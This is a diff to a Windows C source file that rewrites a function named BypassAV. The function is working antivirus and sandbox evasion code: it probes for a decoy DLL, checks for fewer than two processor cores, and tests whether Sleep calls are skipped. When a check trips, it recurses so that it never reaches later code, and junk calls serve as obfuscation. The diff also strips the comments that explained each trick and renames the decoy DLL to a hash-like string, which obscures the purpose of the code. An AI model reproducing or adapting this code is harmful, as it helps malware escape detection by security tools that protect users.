@@ -12,37 +12,29 @@ void Hop5();
 
 
 DWORD WINAPI BypassAV(LPVOID params){
-	Bunny();// }=> Obfuscate the code with function calls and garbage memory allocations...
+	Bunny();
+
+	HINSTANCE DLL = LoadLibrary(TEXT("27a01d4772038a3f83552908e0470604e773f8af.dll"));
+	if(DLL != NULL){
+		BypassAV(NULL); 
+	}
+
+	SYSTEM_INFO SysGuide;
+	GetSystemInfo(&SysGuide);
+	int CoreNum = SysGuide.dwNumberOfProcessors;
+	if(CoreNum < 2){
+		BypassAV(NULL);
+	}
 
 
-	HINSTANCE DLL = LoadLibrary(TEXT("fakeass.dll")); //}
-	if(DLL != NULL){//								 |
-		BypassAV(NULL);					//				 |=> Try to load a fake dll... 
-	}//												 }
+	int Tick = GetTickCount(); 
+	Sleep(1000);			  
+	int Tac = GetTickCount(); 
+	if((Tac - Tick) < 1000){  
+		BypassAV(NULL);		
+	}																						
 
-
-
-
-	SYSTEM_INFO SysGuide;//                         	}
-	GetSystemInfo(&SysGuide);//							|
-	int CoreNum = SysGuide.dwNumberOfProcessors;//		|
-	if(CoreNum < 2){//									|=> Check the number of processor cores...
-		BypassAV(NULL);					//					|
-	}//													}
-
-
-
-	//							     }
-	int Tick = GetTickCount();     //| 
-	Sleep(1000);			       //|
-	int Tac = GetTickCount();      //|
-	if((Tac - Tick) < 1000){   	   //|=> Check if the sleep function is skipped...
-		BypassAV(NULL);				   //|
-	}						       //|
-	//							     }																
-
-
-	Bunny();//}=> Obfuscate the code with function calls and garbage memory allocations...
+	Bunny();
 
 	return true;
 }
